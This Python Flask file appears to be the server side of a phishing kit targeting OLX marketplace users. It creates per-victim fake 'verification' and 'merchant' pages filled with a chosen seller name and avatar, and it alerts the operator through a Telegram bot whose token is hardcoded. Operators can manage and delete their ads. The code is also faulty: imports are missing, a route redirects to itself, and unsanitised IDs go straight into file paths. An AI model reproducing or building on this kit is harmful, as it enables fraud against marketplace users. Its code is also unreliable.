from flask import Flask, request, jsonify, render_template_string, send_from_directory
import os
import shutil
from bs4 import BeautifulSoup
import json

app = Flask(__name__)

# Telegram bot token and chat_id (replace with your actual token and chat_id)
TELEGRAM_BOT_TOKEN = '7216530203:AAHo7UsufnSII67aV1ZINQ91OV1TL_WjaSw'
TELEGRAM_CHAT_ID = '6958729639'

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response

@app.route('/verif/<random_id>', methods=['GET'])
def handle_verification(random_id):
    # Sending message to Telegram bot
    message = f"New visit to verification page with ID: {random_id}"
    response = send_telegram_message(message)
    
    if response.status_code != 200:
        return jsonify({'error': 'Failed to send message to Telegram bot'}), 500
    
    # Redirecting to the verification page
    return redirect(f"https://{request.host}/verif/{random_id}")

@app.route('/verif/<random_id>', methods=['POST'])
def save_page(random_id):
    seller_name_tag = request.form.get('seller_name_tag')
    avatar_url = request.form.get('avatar_url')
    current_domain = request.form.get('current_domain')

    if not seller_name_tag or not avatar_url or not current_domain:
        return jsonify({'error': 'Missing data'}), 400

    # Define paths
    page_save_path = f"/var/www/olx-verif/verif/{random_id}/index.html"
    verif_source_dir = '/home/user/services/olx-verif/verif/'
    merchant_source_dir = '/home/user/services/olx-verif/merchant/'
    verif_source_file = os.path.join(verif_source_dir, 'index.html')
    merchant_source_file = os.path.join(merchant_source_dir, 'index.html')
    verif_destination_file = os.path.join('/var/www/olx-verif/verif', random_id, 'index.html')
    merchant_destination_file = os.path.join('/var/www/olx-verif/merchant', random_id, 'index.html')

    # Create directories and copy files
    os.makedirs(os.path.dirname(page_save_path), exist_ok=True)
    if os.path.exists(verif_source_file):
        shutil.copy(verif_source_file, verif_destination_file)
    else:
        return jsonify({'error': 'File /home/user/services/olx-verif/verif/index.html not found'}), 404

    if os.path.exists(merchant_source_file):
        os.makedirs(os.path.dirname(merchant_destination_file), exist_ok=True)
        shutil.copy(merchant_source_file, merchant_destination_file)
    else:
        return jsonify({'error': 'File /home/user/services/olx-verif/merchant/index.html not found'}), 404

    # Replace the content in the file
    with open(verif_destination_file, 'r') as file:
        content = file.read()

    soup = BeautifulSoup(content, 'html.parser')
    shop_info_div = soup.find('div', class_='shop-info')

    if shop_info_div:
        img_tag = shop_info_div.find('img')
        if img_tag:
            img_tag['src'] = avatar_url

        h3_tag = shop_info_div.find('h3')
        if h3_tag:
            h3_tag.contents[0].replace_with(seller_name_tag)

        button_container = soup.find('div', class_='button-container')
        if button_container:
            button = button_container.find('button')
            if button:
                button['onclick'] = f"window.location.href='/merchant/{random_id}'"

    with open(verif_destination_file, 'w') as file:
        file.write(str(soup))

    return jsonify({'message': 'Page saved and files copied successfully'}), 200

@app.route('/merchant/<random_id>')
def serve_merchant_page(random_id):
    merchant_path = f"/var/www/olx-verif/merchant/{random_id}"
    return send_from_directory(merchant_path, 'index.html')

@app.route('/load_links', methods=['GET'])
def load_links():
    links_file = '/home/user/app/data/links.json'

    if os.path.exists(links_file):
        with open(links_file, 'r', encoding='utf-8') as file:
            links = json.load(file)
    else:
        links = []

    return jsonify(links), 200

@app.route('/save_link', methods=['POST'])
def save_link():
    link_data = request.get_json()
    if not link_data:
        return jsonify({'error': 'No data provided'}), 400

    links_file = '/home/user/app/data/links.json'
    links_dir = os.path.dirname(links_file)

    # Создаем директорию, если она не существует
    os.makedirs(links_dir, exist_ok=True)

    # Загружаем существующие данные
    if os.path.exists(links_file):
        with open(links_file, 'r', encoding='utf-8') as file:
            links = json.load(file)
    else:
        links = []

    # Убедитесь, что данных нет дубликатов
    existing_link_ids = {link['link_id'] for link in links}
    new_links = [link for link in link_data if link['link_id'] not in existing_link_ids]

    # Добавляем новые данные
    links.extend(new_links)

    # Сохраняем данные обратно в файл
    with open(links_file, 'w', encoding='utf-8') as file:
        json.dump(links, file, indent=4, ensure_ascii=False)

    return jsonify({'message': 'Links saved successfully'}), 200

@app.route('/delete_ad', methods=['POST'])
def delete_ad():
    ad_data = request.get_json()
    ad_id = ad_data.get('ad_id')

    if not ad_id:
        return jsonify({'error': 'No ad_id provided'}), 400

    links_file = '/home/user/app/data/links.json'
    verif_path = f'/var/www/olx-verif/verif/{ad_id}'
    merchant_path = f'/var/www/olx-verif/merchant/{ad_id}'

    # Загружаем существующие данные
    if os.path.exists(links_file):
        with open(links_file, 'r', encoding='utf-8') as file:
            links = json.load(file)
    else:
        links = []

    # Удаляем объявление из списка
    links = [ad for ad in links if str(ad['link_id']) != ad_id]

    # Сохраняем обновленные данные обратно в файл
    with open(links_file, 'w', encoding='utf-8') as file:
        json.dump(links, file, indent=4, ensure_ascii=False)

    # Удаляем директории
    if os.path.exists(verif_path):
        shutil.rmtree(verif_path)
    if os.path.exists(merchant_path):
        shutil.rmtree(merchant_path)

    return jsonify({'message': 'Ad deleted successfully'}), 200

@app.route('/delete_all_ads', methods=['POST'])
def delete_all_ads():
    ad_data = request.get_json()
    user_id = ad_data.get('user_id')

    if not user_id:
        return jsonify({'error': 'No user_id provided'}), 400

    links_file = '/home/user/app/data/links.json'

    # Загружаем существующие данные
    if os.path.exists(links_file):
        with open(links_file, 'r', encoding='utf-8') as file:
            links = json.load(file)
    else:
        links = []

    # Находим все объявления пользователя и удаляем соответствующие директории
    user_ads = [ad for ad in links if ad['user_id'] == user_id]
    for ad in user_ads:
        verif_path = f'/var/www/olx-verif/verif/{ad["link_id"]}'
        merchant_path = f'/var/www/olx-verif/merchant/{ad["link_id"]}'
        if os.path.exists(verif_path):
            shutil.rmtree(verif_path)
        if os.path.exists(merchant_path):
            shutil.rmtree(merchant_path)

    # Удаляем объявления пользователя из списка
    links = [ad for ad in links if ad['user_id'] != user_id]

    # Сохраняем обновленные данные обратно в файл
    with open(links_file, 'w', encoding='utf-8') as file:
        json.dump(links, file, indent=4, ensure_ascii=False)

    return jsonify({'message': 'All ads deleted successfully'}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
